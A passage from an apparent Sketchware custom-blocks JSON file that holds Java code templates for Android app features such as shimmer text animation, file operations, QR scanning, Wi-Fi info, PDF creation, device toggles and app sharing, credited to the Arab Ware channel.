}\n\n    @Override\n    public void setPrimaryColor(int primaryColor) {\n        shimmerViewHelper.setPrimaryColor(primaryColor);\n    }\n\n    @Override\n    public int getReflectionColor() {\n        return shimmerViewHelper.getReflectionColor();\n    }\n\n    @Override\n    public void setReflectionColor(int reflectionColor) {\n        shimmerViewHelper.setReflectionColor(reflectionColor);\n    }\n\n    @Override\n    public void setTextColor(int color) {\n        super.setTextColor(color);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n        }\n    }\n\n    @Override\n    public void setTextColor(android.content.res.ColorStateList colors) {\n        super.setTextColor(colors);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n        }\n    }\n\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.onSizeChanged();\n        }\n    }\n\n    @Override\n    public void onDraw(Canvas canvas) {\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.onDraw();\n        }\n        super.onDraw(canvas);\n    }\n}\n\n\npublic class ShimmerButton extends Button implements ShimmerViewBase {\n\n    private ShimmerViewHelper shimmerViewHelper;\n\n    public ShimmerButton(Context context) {\n        super(context);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), null);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    public ShimmerButton(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), attrs);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    public ShimmerButton(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        shimmerViewHelper \u003d new ShimmerViewHelper(this, getPaint(), attrs);\n        shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n    }\n\n    @Override\n    public float getGradientX() {\n        return shimmerViewHelper.getGradientX();\n    }\n\n    @Override\n    public void setGradientX(float gradientX) {\n        shimmerViewHelper.setGradientX(gradientX);\n    }\n\n    @Override\n    public boolean isShimmering() {\n        return shimmerViewHelper.isShimmering();\n    }\n\n    @Override\n    public void setShimmering(boolean isShimmering) {\n        shimmerViewHelper.setShimmering(isShimmering);\n    }\n\n    @Override\n    public boolean isSetUp() {\n        return shimmerViewHelper.isSetUp();\n    }\n\n    @Override\n    public void setAnimationSetupCallback(ShimmerViewHelper.AnimationSetupCallback callback) {\n        shimmerViewHelper.setAnimationSetupCallback(callback);\n    }\n\n    @Override\n    public int getPrimaryColor() {\n        return shimmerViewHelper.getPrimaryColor();\n    }\n\n    @Override\n    public void setPrimaryColor(int primaryColor) {\n        shimmerViewHelper.setPrimaryColor(primaryColor);\n    }\n\n    @Override\n    public int getReflectionColor() {\n        return shimmerViewHelper.getReflectionColor();\n    }\n\n    @Override\n    public void setReflectionColor(int reflectionColor) {\n        shimmerViewHelper.setReflectionColor(reflectionColor);\n    }\n\n    @Override\n    public void setTextColor(int color) {\n        super.setTextColor(color);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n        }\n    }\n\n    @Override\n    public void setTextColor(android.content.res.ColorStateList colors) {\n        super.setTextColor(colors);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.setPrimaryColor(getCurrentTextColor());\n        }\n    }\n\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.onSizeChanged();\n        }\n    }\n\n    @Override\n    public void onDraw(Canvas canvas) {\n        if (shimmerViewHelper !\u003d null) {\n            shimmerViewHelper.onDraw();\n        }\n        super.onDraw(canvas);\n    }\n}\n\npublic class Shimmer {\n\n    public static final int ANIMATION_DIRECTION_LTR \u003d 0;\n    public static final int ANIMATION_DIRECTION_RTL \u003d 1;\n\n        private static final int DEFAULT_REPEAT_COUNT \u003d %2$s;\n    private static final long DEFAULT_DURATION \u003d %1$s;\n    private static final long DEFAULT_START_DELAY \u003d %3$s;\n    private static final int DEFAULT_DIRECTION \u003d ANIMATION_DIRECTION_LTR;\n\n    private int repeatCount;\n    private long duration;\n    private long startDelay;\n    private int direction;\n    private android.animation.Animator.AnimatorListener animatorListener;\n\n    private android.animation.ObjectAnimator animator;\n\n    public Shimmer() {\n        repeatCount \u003d DEFAULT_REPEAT_COUNT;\n        duration \u003d DEFAULT_DURATION;\n        startDelay \u003d DEFAULT_START_DELAY;\n        direction \u003d DEFAULT_DIRECTION;\n    }\n\n    public int getRepeatCount() {\n        return repeatCount;\n    }\n\n    public Shimmer setRepeatCount(int repeatCount) {\n        this.repeatCount \u003d repeatCount;\n        return this;\n    }\n\n    public long getDuration() {\n        return duration;\n    }\n\n    public Shimmer setDuration(long duration) {\n        this.duration \u003d duration;\n        return this;\n    }\n\n    public long getStartDelay() {\n        return startDelay;\n    }\n\n    public Shimmer setStartDelay(long startDelay) {\n        this.startDelay \u003d startDelay;\n        return this;\n    }\n\n    public int getDirection() {\n        return direction;\n    }\n\n    public Shimmer setDirection(int direction) {\n\n        if (direction !\u003d ANIMATION_DIRECTION_LTR \u0026\u0026 direction !\u003d ANIMATION_DIRECTION_RTL) {\n            throw new IllegalArgumentException(\"The animation direction must be either ANIMATION_DIRECTION_LTR or ANIMATION_DIRECTION_RTL\");\n        }\n\n        this.direction \u003d direction;\n        return this;\n    }\n\n    public android.animation.Animator.AnimatorListener getAnimatorListener() {\n        return animatorListener;\n    }\n\n    public Shimmer setAnimatorListener(android.animation.Animator.AnimatorListener animatorListener) {\n        this.animatorListener \u003d animatorListener;\n        return this;\n    }\n\n    public \u003cV extends View \u0026 ShimmerViewBase\u003e void start(final V shimmerView) {\n\n        if (isAnimating()) {\n            return;\n        }\n\n        final Runnable animate \u003d new Runnable() {\n            @Override\n            public void run() {\n\n                shimmerView.setShimmering(true);\n\n                float fromX \u003d 0;\n                float toX \u003d shimmerView.getWidth();\n                if (direction \u003d\u003d ANIMATION_DIRECTION_RTL) {\n                    fromX \u003d shimmerView.getWidth();\n                    toX \u003d 0;\n                }\n\n                animator \u003d android.animation.ObjectAnimator.ofFloat(shimmerView, \"gradientX\", fromX, toX);\n                animator.setRepeatCount(repeatCount);\n                animator.setDuration(duration);\n                animator.setStartDelay(startDelay);\n                animator.addListener(new android.animation.Animator.AnimatorListener() {\n                    @Override\n                    public void onAnimationStart(android.animation.Animator animation) {\n                    }\n\n                    @Override\n                    public void onAnimationEnd(android.animation.Animator animation) {\n                        shimmerView.setShimmering(false);\n\n                        if (Build.VERSION.SDK_INT \u003c Build.VERSION_CODES.JELLY_BEAN) {\n                            shimmerView.postInvalidate();\n                        } else {\n                            shimmerView.postInvalidateOnAnimation();\n                        }\n\n                        animator \u003d null;\n                    }\n\n                    @Override\n                    public void onAnimationCancel(android.animation.Animator animation) {\n\n                    }\n\n                    @Override\n                    public void onAnimationRepeat(android.animation.Animator animation) {\n\n                    }\n                });\n\n                if (animatorListener !\u003d null) {\n                    animator.addListener(animatorListener);\n                }\n\n                animator.start();\n            }\n        };\n\n        if (!shimmerView.isSetUp()) {\n            shimmerView.setAnimationSetupCallback(new ShimmerViewHelper.AnimationSetupCallback() {\n                @Override\n                public void onSetupAnimation(final View target) {\n                    animate.run();\n                }\n            });\n        } else {\n            animate.run();\n        }\n    }\n\n    public void cancel() {\n        if (animator !\u003d null) {\n            animator.cancel();\n        }\n    }\n\n    public boolean isAnimating() {\n        return animator !\u003d null \u0026\u0026 animator.isRunning();\n    }\n}\n","color":"#FFFFA000","name":"Shimmer","typeName":"","palette":"134","type":" ","spec":"Library shimmer duration%d  Repeat count %d delay %d "},{"code":"Version_name \u003d \"null\"; try{ android.content.pm.PackageInfo pInfo \u003d MainActivity.this.getPackageManager().getPackageInfo(getPackageName(), 0); Version_name \u003d pInfo.versionName; } catch (android.content.pm.PackageManager.NameNotFoundException e){ e.printStackTrace(); }","color":"#FF7986CB","name":"GetVersion","typeName":"Version","palette":"135","type":" ","spec":" GetVersion"},{"code":"String appVersion \u003d getAppVersion();\n\n        // Use a variável \"appVersion\" conforme necessário no Sketchware\n    }\n\n    private String getAppVersion() {\n        try {\n            PackageManager packageManager \u003d getPackageManager();\n            PackageInfo packageInfo \u003d packageManager.getPackageInfo(getPackageName(), 0);\n            return packageInfo.versionName;\n        } catch (PackageManager.NameNotFoundException e) {\n            e.printStackTrace();\n            return \"\";\n        }","color":"#FF7986CB","name":"GetAppVersion","typeName":"appVersion","palette":"135","type":"s","spec":"appVersion"},{"code":"handler \u003d new Handler(new Handler.Callback() {\n            @Override\n            public boolean handleMessage(Message msg) {\n                if (msg.what \u003d\u003d 1) {\n                    String lastUpdatedDate \u003d (String) msg.obj;\n                    // Faça algo com a data da última atualização\n                }\n                return true;\n            }\n        });\n    }\n\n    private void obtainLastUpdatedDate(final String url) {\n        Thread thread \u003d new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    URL urlObject \u003d new URL(url);\n                    HttpURLConnection connection \u003d (HttpURLConnection) urlObject.openConnection();\n                    long lastModified \u003d connection.getLastModified();\n\n                    SimpleDateFormat dateFormat \u003d new SimpleDateFormat(\"dd/MM/yyyy HH:mm:ss\");\n                    String lastUpdatedDate \u003d dateFormat.format(new Date(lastModified));\n\n                    Message message \u003d handler.obtainMessage(1, lastUpdatedDate);\n                    handler.sendMessage(message);\n\n                    connection.disconnect();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n\n        thread.start();\n    }","color":"#FF7986CB","name":"appVersion","typeName":"appVersion","palette":"126","type":"s","spec":"check update in %1$s.webView"},{"code":"","color":"#FF795548","name":"File","typeName":"","palette":"136","type":"h","spec":"File"},{"code":"FileUtil.writeFile(%2$s, %1$s);","color":"#FF795548","name":"File - writeFile","typeName":"","palette":"136","type":" ","spec":"write String %s  to file path %s "},{"code":"FileUtil.readFile(%1$s)","color":"#FF795548","name":"File - readFilePath","typeName":"","palette":"136","type":"s","spec":"read file path %s "},{"code":"FileUtil.deleteFile(%1$s);","color":"#FF795548","name":"File - deleteFilePath","typeName":"","palette":"136","type":" ","spec":"delete file path %s "},{"code":"FileUtil.listDir(%1$s, %2$s);","color":"#FF795548","name":"File - fileListInListString","typeName":"","palette":"136","type":" ","spec":"file list in path %s to %m.listStr "},{"code":"FileUtil.makeDir(%1$s);","color":"#FF795548","name":"File - makeDirectoryPath","typeName":"","palette":"136","type":" ","spec":"make directory path %s "},{"code":"FileUtil.isDirectory(%1$s)","color":"#FF795548","name":"File - isPathDirectory","typeName":"","palette":"136","type":"b","spec":"path %s is directory"},{"code":"FileUtil.isFile(%1$s)","color":"#FF795548","name":"File - isPathFile","typeName":"","palette":"136","type":"b","spec":"path %s is file"},{"code":"FileUtil.isExistFile(%1$s)","color":"#FF795548","name":"File - isExistFile","typeName":"","palette":"136","type":"b","spec":"is exist file path %s "},{"code":"Uri.parse(%1$s).getLastPathSegment()","color":"#FF795548","name":"File - getLastSegmentOfPath","typeName":"","palette":"136","type":"s","spec":"get last segment path of %s "},{"code":"FileUtil.getExternalStorageDir()","color":"#FF795548","name":"File - getExternalStorageDirectory","typeName":"","palette":"136","type":"s","spec":"get external storage directory"},{"code":"FileUtil.getPackageDataDir(getApplicationContext())","color":"#FF795548","name":"File - getPackageDataDirectory","typeName":"","palette":"136","type":"s","spec":"get package data directory"},{"code":"new File(%1$s).canRead()","color":"#FF795548","name":"File - canRead","typeName":"","palette":"136","type":"b","spec":"FilePath %s canRead"},{"code":"new File(%1$s).canWrite()","color":"#FF795548","name":"File - canWrite","typeName":"","palette":"136","type":"b","spec":"FilePath %s canWrite"},{"code":"%1$s \u003d new CodeScanner(this, %2$s);","color":"#FF03A9F4","name":"Set CodeScanner To The ScannerView","typeName":"","palette":"137","type":" ","spec":"%m.CodeScanner setScannerView %m.view"},{"code":"%1$s.setDecodeCallback(new DecodeCallback() {\n            @Override\n            public void onDecoded(@NonNull final Result result) {\n                runOnUiThread(new Runnable() {\n                    @Override\n                    public void run() {\n                %2$s\n                    }\n                });\n            }\n        });","color":"#FF03A9F4","name":"On Scanning Competed","typeName":"","palette":"137","type":"c","spec":"%m.CodeScanner setOnScanningCompleted"},{"code":"result.getText()","color":"#FF03A9F4","name":"Get Result From The ScannerView","typeName":"","palette":"137","type":"s","spec":"getResultFromTheScannerView"},{"code":"%1$s.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                %2$s\n            }\n        });       ","color":"#FF03A9F4","name":"On Scanner View Clicked","typeName":"","palette":"137","type":"c","spec":"%m.view setOnScannerViewClicked"},{"code":"%1$s.startPreview();","color":"#FF03A9F4","name":"Start ScannerView Scanning","typeName":"","palette":"137","type":" ","spec":"%m.CodeScanner startScanning"},{"code":"%1$s.releaseResources();","color":"#FF03A9F4","name":"CodeScanner Release Resources","typeName":"","palette":"137","type":" ","spec":"%m.CodeScanner releaseResources"},{"code":" %1$s.setFlashButtonColor(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Flash Button Color","typeName":"","palette":"137","type":" ","spec":"%m.view setFlashButtonColor %m.color"},{"code":" %1$s.setAutoFocusButtonColor(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Auto Focus Button Color","typeName":"","palette":"137","type":" ","spec":"%m.view setAutoFocusButtonColor %m.color"},{"code":" %1$s.setMaskColor(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Mask Color","typeName":"","palette":"137","type":" ","spec":"%m.view setMaskColor %m.color"},{"code":" %1$s.setFrameColor(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Frame Color","typeName":"","palette":"137","type":" ","spec":"%m.view setFrameColor %m.color"},{"code":" %1$s.setFlashButtonVisible(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Flash Button Visibility","typeName":"","palette":"137","type":" ","spec":"%m.view setFlashButtonVisiblity %b"},{"code":" %1$s.setAutoFocusButtonVisible(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Auto Focus Button Visibility","typeName":"","palette":"137","type":" ","spec":"%m.view setAutoFocusButtonVisiblity %b"},{"code":" %1$s.setMaskVisible(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Mask Visibility","typeName":"","palette":"137","type":" ","spec":"%m.view setMaskVisiblity %b"},{"code":" %1$s.setFrameVisible(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Frame Visibility","typeName":"","palette":"137","type":" ","spec":"%m.view setFrameVisiblity %b"},{"code":" %1$s.setFrameThickness(%2$s);","color":"#FF03A9F4","name":"Set ScannerView Frame Thickness","typeName":"","palette":"137","type":" ","spec":"%m.view setFrameThickness %d"},{"code":"//Don\u0027t Forget To Add Camera Component For Camera Permission","color":"#FF03A9F4","name":"Notice","typeName":"","palette":"137","type":"s","spec":"Don\u0027t Forget To Add Camera Component For Camera Permission"},{"code":"//Created By SE BIBEL MEK","color":"#FF03A9F4","name":"Credit","typeName":"","palette":"137","type":"s","spec":"Created By SE BIBEL MEK"},{"code":"String %1$s \u003d %2$s;","color":"#FF388E3C","name":"Set Text Of QR","typeName":"","palette":"138","type":" ","spec":"Create QR %s.inputOnly Set Text %s"},{"code":"ArabWareChannelAPI.concat(%1$s.concat(\"?b\u003dq\u0026size\u003d\".concat(String.valueOf((long)(%2$s.getHeight())).concat(\"×\").concat(String.valueOf((long)(%2$s.getWidth()))))))","color":"#FF388E3C","name":"get url","typeName":"","palette":"138","type":"s","spec":"Get QR %s.inputOnly set area of QR like %m.imageview"},{"code":"%1$s \u003d (WifiManager)getSystemService(getApplicationContext().WIFI_SERVICE);\n%2$s \u003d %1$s.getConnectionInfo();","color":"#FF2E7D32","name":"WifiManager","typeName":"","palette":"139","type":" ","spec":"create %m.WifiManager \u0026 %m.WifiInfo On Create"},{"code":"%1$s.getSSID()","color":"#FF2E7D32","name":"getSSID","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get SSID"},{"code":"%1$s.getBSSID()","color":"#FF2E7D32","name":"getBSSID","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get BSSID"},{"code":"%1$s.getMacAddress()","color":"#FF2E7D32","name":"getMacAddress","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get MaxAddress"},{"code":"%1$s.getFrequency() + WifiInfo.FREQUENCY_UNITS","color":"#FF2E7D32","name":"getFrequency","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get Frequency"},{"code":"%1$s.getLinkSpeed() + WifiInfo.LINK_SPEED_UNITS","color":"#FF2E7D32","name":"getLinkSpeed","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get LinkSpeed"},{"code":"String.valueOf((long) %1$s.getRssi())","color":"#FF2E7D32","name":"getRssi","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get Rssi"},{"code":"String.format(%2$s,(%1$s.getIpAddress() \u0026 0xff),(%1$s.getIpAddress() \u003e\u003e 8 \u0026 0xff),\r(%1$s.getIpAddress() \u003e\u003e 16 \u0026 0xff),(%1$s.getIpAddress() \u003e\u003e 24 \u0026 0xff))","color":"#FF2E7D32","name":"getIPAddress","typeName":"","palette":"139","type":"s","spec":"%m.WifiInfo get IP Address with type %s"},{"code":"","color":"#FF7B1FA2","name":"CREATED BY \u0026 TOOK SOME CODES FROM","typeName":"","palette":"140","type":"h","spec":"CREATED BY ARAB WARE CHANN THANKS TO SKETCHWARE ARABI CHANNEL FOR SOME HELP"},{"code":"}\nprivate Bitmap %1$sbit;\nprivate Bitmap %1$sbitmap;\nprivate float %1$sbitmapRatio;\nprivate int %1$swidth;\nprivate int %1$sheight;\nprivate int %1$smaxSize;\nprivate android.graphics.pdf.PdfDocument.PageInfo %1$smyPageInfo;\nprivate android.graphics.pdf.PdfDocument.Page %1$spage;\nprivate java.io.File %1$sFile;\n{","color":"#FF7B1FA2","name":"putMeAtMoreBlock","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument put me at more block"},{"code":"%1$s \u003d new android.graphics.pdf.PdfDocument();","color":"#FF7B1FA2","name":"create new pdf creator","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument create new one"},{"code":"%1$sbit \u003d BitmapFactory.decodeFile(%2$s);\r\n\t%1$swidth \u003d %1$sbit.getWidth();\n\t%1$sheight \u003d %1$sbit.getHeight();\n\t%1$smaxSize \u003d 1100;\n\t%1$sbitmapRatio \u003d (float)%1$swidth / (float)%1$sheight;\r\n\tif (%1$sbitmapRatio \u003e 1) {\n\t\t%1$swidth \u003d %1$smaxSize;\n\t\t%1$sheight \u003d (int)(%1$swidth / %1$sbitmapRatio);\n\t} else {\n\t\t%1$sheight \u003d %1$smaxSize;\n%1$swidth \u003d (int)(%1$sheight * %1$sbitmapRatio);\n\t}\r\n\t%1$sbitmap \u003d Bitmap.createScaledBitmap(%1$sbit, %1$swidth, %1$sheight, true);\r\n\t%1$smyPageInfo \u003d new android.graphics.pdf.PdfDocument.PageInfo.Builder(%1$sbitmap.getWidth(),%1$sbitmap.getHeight(),1).create();\r\n\t%1$spage \u003d %1$s.startPage(%1$smyPageInfo);\r\n\t%1$spage.getCanvas().drawBitmap(%1$sbitmap,0,0, null);\n\t%1$s.finishPage(%1$spage);","color":"#FF7B1FA2","name":"AddPage","typeName":"","palette":"140","type":" ","spec":"add page to %m.PdfDocument from image path %s"},{"code":"%1$sFile \u003d new java.io.File(%2$s);\r\ntry {\n\t%1$s.writeTo(new java.io.FileOutputStream(%1$sFile));\n} catch (java.io.IOException e) {\r\n}\n%1$s.close();","color":"#FF7B1FA2","name":"SavePdf","typeName":"","palette":"140","type":" ","spec":"%m.PdfDocument save to path %s"},{"code":"","color":"#FF2196F3","name":"Arab Ware","typeName":"","palette":"141","type":"h","spec":"Created By Arab Ware Channel"},{"code":"","color":"#FF2196F3","name":"Something Needs Storage permission or another","typeName":"","palette":"141","type":"h","spec":"some blocks Need Storage permission or another"},{"code":"AsyncTask.execute(new Runnable() {\n   @Override\n   public void run() {\n%s\n   }\n});","color":"#FF2196F3","name":"background work","typeName":"","palette":"141","type":"c","spec":"make below working on background"},{"code":"%1$s \u003d new MediaPlayer();\n\n%1$s.setAudioStreamType(3);\n\ntry {\n%1$s.setDataSource(\"%2$s\");\n\n}catch (IllegalArgumentException e) {\n\n%3$s\n\n} catch (SecurityException e2) { \n\n%3$s\n}\n\ncatch (IllegalStateException e3) { \n\n%3$s\n}\n\ncatch (java.io.IOException e4)\n{\ne4.printStackTrace();\n}\n\n\ntry\n{\n%1$s.prepare();\n%4$s\n}\ncatch (IllegalStateException e5)\n{\n%3$s\n}\ncatch (java.io.IOException e6)\n{ \n%3$s\n}","color":"#FF2196F3","typeName":"","name":"Play music online","palette":"141","type":"e","spec":"try to play music with id %m.mediaplayer  from link %s.inputOnly if got error then","spec2":"else"},{"code":"try{\nint count;\njava.io.InputStream input\u003d this.getAssets().open(%s);\njava.io.OutputStream output \u003d new  java.io.FileOutputStream(%s+%s);\nbyte data[] \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}","color":"#FF2196F3","name":"assets save","typeName":"","palette":"141","type":" ","spec":"save file from assets that has name  %s into path %s with name %s"},{"code":"Intent intent \u003d new Intent(Intent.ACTION_SENDTO); intent.setData(Uri.parse(\"mailto:\")); intent.putExtra(Intent.EXTRA_EMAIL , new String[] { %s }); intent.putExtra(Intent.EXTRA_SUBJECT, %s); startActivity(Intent.createChooser(intent, \"Email via...\"));","color":"#FF2196F3","name":"send email","typeName":"","palette":"141","type":" ","spec":"send message from user to your gmali %s  with message %s "},{"code":"getApplicationContext().getPackageName()","color":"#FF2196F3","name":"packagename","typeName":"","palette":"141","type":"s","spec":"get package name of this app"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, true); } catch (android.hardware.camera2.CameraAccessException e) { }","color":"#FF2196F3","name":"Flashlight On","typeName":"","palette":"141","type":" ","spec":"Flashlight On"},{"code":"android.hardware.camera2.CameraManager cameraManager \u003d (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);\ntry {\nString cameraId \u003d cameraManager.getCameraIdList()[0]; cameraManager.setTorchMode(cameraId, false); } catch (android.hardware.camera2.CameraAccessException e) { }","name":"Flashlight Off","palette":"141","type":" ","spec":"Flashlight Off"},{"code":"Intent launchIntent \u003d getPackageManager().getLaunchIntentForPackage(%s);  { startActivity(launchIntent);}","color":"#FF2196F3","name":"open app","typeName":"","palette":"141","type":" ","spec":"open app with package name %s "},{"code":"Uri packageURI \u003d Uri.parse(\"package:\".concat(%s)); Intent uninstallIntent \u003d new Intent(Intent.ACTION_DELETE, packageURI); startActivity(uninstallIntent);","color":"#FF2196F3","name":"uninstall app","typeName":"","palette":"141","type":" ","spec":"uninstall app with package name %s "},{"code":"Intent intent \u003d new Intent(\"android.intent.action.MAIN\");\nintent.setClassName(\"%1$s\",\"%2$s\");\nthis.startActivity(intent);","color":"#FF2196F3","name":"open class in app","typeName":"","palette":"141","type":" ","spec":"open class with name %s.inputOnly in app with package name %s.inputOnly "},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);","color":"#FF2196F3","name":"one","typeName":"","palette":"141","type":" ","spec":"Landscape Orientation"},{"code":"setRequestedOrientation(android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);","color":"#FF2196F3","name":"two","typeName":"","palette":"141","type":" ","spec":"Portrait Orientation"},{"code":"%s.performClick(); ","color":"#FF2196F3","name":"Click","typeName":"","palette":"141","type":" ","spec":"click %m.view"},{"code":"getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);","color":"#FF2196F3","name":"screen on","typeName":"","palette":"141","type":" ","spec":"Keep device screen on"},{"code":"getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);","color":"#FF2196F3","name":"screen of","typeName":"","palette":"141","type":" ","spec":"Keep device screen off"},{"code":"Intent %2$s \u003d new Intent(MediaStore.ACTION_VIDEO_CAPTURE);\n\nif (%2$s.resolveActivity(getPackageManager()) !\u003d null) {startActivityForResult(%2$s, REQ_CD_%1$s);\n\n}","color":"#FF2196F3","name":"record video","typeName":"","palette":"141","type":" ","spec":"use %m.camera to record video with id %s.inputOnly "},{"code":"android.bluetooth.BluetoothAdapter adapter \u003d android.bluetooth.BluetoothAdapter.getDefaultAdapter();\nadapter.disable();","color":"#FF2196F3","name":"disable bluetooth","typeName":"","palette":"141","type":" ","spec":"Disable Bluetooth"},{"code":"android.bluetooth.BluetoothAdapter adapter \u003d android.bluetooth.BluetoothAdapter.getDefaultAdapter();\nadapter.enable();","color":"#FF2196F3","name":"enable bluetooth","typeName":"","palette":"141","type":" ","spec":"Enable Bluetooth"},{"code":"getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);","color":"#FF2196F3","name":"Block Screen Shots","typeName":"","palette":"141","type":" ","spec":"Blocks Screen Shots"},{"code":"this.getApplicationContext()","color":"#FF2196F3","name":"get application context","typeName":"","palette":"141","type":"s","spec":"get application context"},{"code":"","color":"#FF039BE5","name":"ArabWare ","typeName":"","palette":"142","type":"h","spec":"created by arab ware channel"},{"code":"String apk \u003d %s;\nString uri \u003d (getApplicationContext().getPackageName());\n\ntry {\n\tandroid.content.pm.PackageInfo pi \u003d getPackageManager().getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES);\n\t\n\tapk \u003d pi.applicationInfo.publicSourceDir;\n} catch (Exception e) {\n\tshowMessage(e.toString());\n}\nIntent iten \u003d new Intent(Intent.ACTION_SEND);\niten.setType(\"*/*\");\niten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(apk)));\n\nstartActivity(Intent.createChooser(iten, %s));","color":"#FF039BE5","name":"MyApp","typeName":"","palette":"142","type":" ","spec":"Share This App As Apk File With Name %s (for example app.apk) with message %s"},{"code":"String apk \u003d %s;\nString uri \u003d (%s);\n\ntry {\n\tandroid.content.pm.PackageInfo pi \u003d getPackageManager().getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES);\n\t\n\tapk \u003d pi.applicationInfo.publicSourceDir;\n} catch (Exception e) {\n\tshowMessage(e.toString());\n}\nIntent iten \u003d new Intent(Intent.ACTION_SEND);\niten.setType(\"*/*\");\niten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(apk)));\n\nstartActivity(Intent.createChooser(iten, %s));","color":"#FF039BE5","name":"ShareApp","typeName":"","palette":"142","type":" ","spec":"Share App as file with name  %s (must add .apk For example App.apk) And with package name %s with message %s"},{"code":"Intent i \u003d new Intent(android.content.Intent.ACTION_SEND); i.setType(\"text/plain\"); i.putExtra(android.content.Intent.EXTRA_TEXT, %s); startActivity(Intent.createChooser(i,%s));","color":"#FF039BE5","name":"Share Text","typeName":"","palette":"142","type":" ","spec":"Share The text ( %s ) with message %s"},{"code":"Bitmap bm \u003d ((android.graphics.drawable.BitmapDrawable) %s.getDrawable()).getBitmap(); try { java.io.File file \u003d new java.io.File(getExternalCacheDir() + \"/image.jpg\"); java.io.OutputStream out \u003d new java.io.FileOutputStream(file); bm.compress(Bitmap.CompressFormat.JPEG, 100, out); out.flush(); out.close(); } catch (Exception e) { showMessage(e.toString()); } Intent iten \u003d new Intent(android.content.Intent.ACTION_SEND); iten.setType(\"*/*\"); iten.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(getExternalCacheDir() + \"/image.jpg\"))); startActivity(Intent.createChooser(iten, \"Send image\"));","color":"#FF039BE5","name":"ShareImage","typeName":"","palette":"142","type":" ","spec":"Share %m.imageview"},{"code":"_ArabWareShareStart();","color":"#FFEF6C00","name":"Start Share","typeName":"","palette":"142","type":" ","spec":"Start Share App Dialog With Message %s"},{"code":"","color":"#FF9C27B0","name":"created by Arab Ware Channel","typeName":"","palette":"143","type":"h","spec":"created by Arab Ware Channel"},{"code":"%1$s.edit().putString(%2$s, %3$s).commit();","color":"#FF9C27B0","name":"lol1","typeName":"","palette":"143","type":" ","spec":"%m.file create or edit key %s with value %s"},{"code":"%1$s.edit().putString(%2$s, String.valueOf((long)(%3$s))).commit();","color":"#FF9C27B0","name":"lol2","typeName":"","palette":"143","type":" ","spec":"%m.file create or edit key %s with value %d"},{"code":"%1$s.edit().putString(%2$s, String.valueOf(%3$s)).commit();","color":"#FF9C27B0","name":"lol3","typeName":"","palette":"143","type":" ","spec":"%m.file create or edit key %s with value %b"},{"code":"%1$s.getString(%2$s, \"\")","color":"#FF9C27B0","name":"lol4","typeName":"","palette":"143","type":"s","spec":"%m.file get key %s to string"},{"code":"Double.parseDouble(%1$s.getString(%2$s, \"\"));","color":"#FF9C27B0","name":"lol5","typeName":"","palette":"143","type":"d","spec":"%m.file get key %s to number ( Double )"},{"code":"Integer.parseInt(%1$s.getString(%2$s, \"\"));","color":"#FF9C27B0","name":"lol6","typeName":"","palette":"143","type":"d","spec":"%m.file get key %s to int"},{"code":"Boolean.valueOf(%1$s.getString(%2$s, \"\"))","color":"#FF9C27B0","name":"lol7","typeName":"","palette":"143","type":"b","spec":"%m.file get key %s to boolean"},{"code":"","color":"#FF00BFA5","name":"created by arab ware channel .....","typeName":"","palette":"144","type":"h","spec":"created by arab ware channel 